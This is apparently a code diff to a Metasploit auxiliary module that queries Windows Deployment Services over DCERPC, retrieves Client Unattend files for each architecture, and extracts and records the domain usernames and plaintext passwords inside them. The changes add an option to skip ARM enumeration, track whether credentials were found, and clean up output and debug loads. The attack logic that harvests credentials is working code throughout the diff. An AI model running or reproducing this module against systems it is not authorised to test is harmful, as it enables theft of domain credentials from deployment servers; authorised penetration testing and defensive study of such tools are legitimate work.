@@ -10,14 +10,6 @@ require 'rex/proto/dcerpc'
 require 'rex/proto/dcerpc/wdscp'
 require 'rex/parser/unattend'
 
-load '/opt/metasploit/msf3/lib/rex/parser/unattend.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/client.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/packet.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/handle.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp/constants.rb'
-load '/opt/metasploit/msf3/lib/rex/proto/dcerpc/wdscp/packet.rb'
-
 class Metasploit3 < Msf::Auxiliary
 
     include Msf::Exploit::Remote::DCERPC
@@ -51,6 +43,11 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(5040),
+			], self.class)
+			
+		register_advanced_options(
+			[
+				OptBool.new('ENUM_ARM', [true, 'Enumerate Unattend for ARM architectures (not supported by Windows and will cause an error in System Event Log)', false])
 			], self.class)	
 	end
 	
@@ -64,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Binding to #{handle} ...")
 		begin
 			self.dcerpc = Rex::Proto::DCERPC::Client.new(self.handle, self.sock)
-			vprint_status("Bound to #{handle} ...")
+			vprint_status("Bound to #{handle}")
 			rescue
 				print_error("Unable to bind")
 				return
@@ -76,7 +73,14 @@ class Metasploit3 < Msf::Auxiliary
                         'Columns' => ['Architecture', 'Domain', 'Username', 'Password']
         })
 		
+		creds_found = false
+		
 		WDS_CONST::ARCHITECTURE.each do |architecture|
+			if architecture[0] == :ARM && !datastore['ENUM_ARM']
+				vprint_status "Skipping #{architecture[0]} architecture due to adv option"
+				next
+			end
+			
 			result = request_client_unattend(architecture)
 			
 			unless result.nil?
@@ -87,6 +91,7 @@ class Metasploit3 < Msf::Auxiliary
 					unless result.empty?
 						unless result['username'].nil? || result['password'].nil?
 							print_good("Retrived credentials for #{architecture[0]}")
+							creds_found = true
 							report_creds(result['domain'], result['username'], result['password'])
 							table << [architecture[0], result['domain'], result['username'], result['password']]
 						end
@@ -95,7 +100,13 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 		
-		print_line table.to_s
+		if creds_found
+			print_line
+			table.print 
+			print_line
+		else
+			print_error("No Unattend files received, service is unlikely to be configured for zero-touch install.")
+		end
 	end
 	
 	def request_client_unattend(architecture)	
@@ -117,18 +128,24 @@ class Metasploit3 < Msf::Auxiliary
 		packet.add_var(	WDS_CONST::VAR_NAME_VERSION,"\x00\x00\x00\x01\x00\x00\x00\x00")	
 		wdsc_packet = packet.create
 		
-		vprint_status("Sending #{architecture[0]} Client Unattend request ...")
+		print_status("Sending #{architecture[0]} Client Unattend request ...")
 		response = dcerpc.call(0, wdsc_packet)
 
 		if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
 			vprint_status('Received response ...')
 			data = dcerpc.last_response.stub_data
 			
-			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000)
+			# Check WDSC_Operation_Header OpCode-ErrorCode is success 0x000000
 			op_error_code = data.unpack('i*')[18]
 			if op_error_code == 0
-				vprint_status("Received #{architecture[0]} response")
-				return extract_unattend(dcerpc.last_response.stub_data)
+				# TODO Check error case where FLAGS variable is 0 (ie no Client Unattend found)
+				if data.length < 277
+					vprint_error("No Unattend received for #{architecture[0]} architecture")
+					return nil
+				else
+					vprint_status("Received #{architecture[0]} unattend file ...")
+					return extract_unattend(data)
+				end
 			else
 				vprint_error("Error code received for #{architecture[0]}: #{op_error_code}")
 				return nil
@@ -137,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 	
 	def extract_unattend(data)
-		start = data.index('<?xml')
+		start = data.index('<?xml')		
 		finish = data.index('</unattend>')+10
 		return data[start..finish]
 	end
@@ -160,12 +177,6 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Raw version of #{archi} saved as: #{p}")
 	end
 	
-	def loot_unattend(archi, data)
-			return if data.empty?	
-			p = store_loot('windows.unattend.raw', 'text/plain', rhost, data, archi, "Windows Deployment Services")
-			print_status("Raw version of #{archi} to loot")
-	end
-	
 	def report_creds(domain, user, pass)
 		report_auth_info(
 				:host  => rhost,
@@ -177,6 +188,4 @@ class Metasploit3 < Msf::Auxiliary
 				:user => "#{domain}\\#{user}",
 				:pass => pass)
 	end
-
-
 end
